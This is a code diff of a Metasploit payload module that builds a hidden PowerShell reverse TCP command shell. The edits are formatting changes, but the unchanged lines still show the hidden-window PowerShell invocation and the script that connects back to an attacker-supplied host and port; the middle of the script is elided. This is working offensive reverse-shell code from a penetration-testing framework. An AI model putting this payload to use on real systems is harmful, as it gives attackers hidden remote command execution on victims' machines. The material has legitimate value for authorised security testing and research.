@@ -3,41 +3,39 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = 1588
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-     'Name'          => 'Windows Command Shell, Reverse TCP (via Powershell)',
-     'Description'   => 'Connect back and create a command shell via Powershell',
-     'Author'        =>
-       [
-         'Dave Kennedy', # Original payload from trustedsec on SET
-         'Ben Campbell' # Metasploit module
-       ],
-     'References'    =>
-       [
-         ['URL', 'https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/powershell/reverse.powershell']
-       ],
-     # The powershell code is from SET, copyrighted by TrustedSEC, LLC and BSD licensed -- see https://github.com/trustedsec/social-engineer-toolkit/blob/master/readme/LICENSE
-     'License'       => MSF_LICENSE,
-     'Platform'      => 'win',
-     'Arch'          => ARCH_CMD,
-     'Handler'       => Msf::Handler::ReverseTcp,
-     'Session'       => Msf::Sessions::CommandShell,
-     'PayloadType'   => 'cmd',
-     'RequiredCmd'   => 'powershell',
-     'Payload'       =>
-       {
-         'Offsets' => { },
-         'Payload' => ''
-       }
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Windows Command Shell, Reverse TCP (via Powershell)',
+        'Description' => 'Connect back and create a command shell via Powershell',
+        'Author' => [
+          'Dave Kennedy', # Original payload from trustedsec on SET
+          'Ben Campbell' # Metasploit module
+        ],
+        'References' => [
+          ['URL', 'https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/powershell/reverse.powershell']
+        ],
+        # The powershell code is from SET, copyrighted by TrustedSEC, LLC and BSD licensed -- see https://github.com/trustedsec/social-engineer-toolkit/blob/master/readme/LICENSE
+        'License' => MSF_LICENSE,
+        'Platform' => 'win',
+        'Arch' => ARCH_CMD,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::CommandShell,
+        'PayloadType' => 'cmd',
+        'RequiredCmd' => 'powershell',
+        'Payload' => {
+          'Offsets' => {},
+          'Payload' => ''
+        }
+      )
+    )
     register_advanced_options(
       [
         OptString.new('PowerShellPath', [true, 'The path to the PowerShell executable', 'powershell'])
@@ -58,7 +56,7 @@ module MetasploitModule
   def command_string
     lhost = datastore['LHOST']
     lport = datastore['LPORT']
-    powershell = %Q^
+    powershell = %^
 $a='#{lhost}';
 $b=#{lport};
 $c=New-Object system.net.sockets.tcpclient;
@@ -110,7 +108,7 @@ while ($true) {
         break;
     }
 }
-^.gsub!("\n", "")
+^.gsub!("\n", '')
 
     "#{datastore['PowerShellPath']} -w hidden -nop -c #{powershell}"
   end
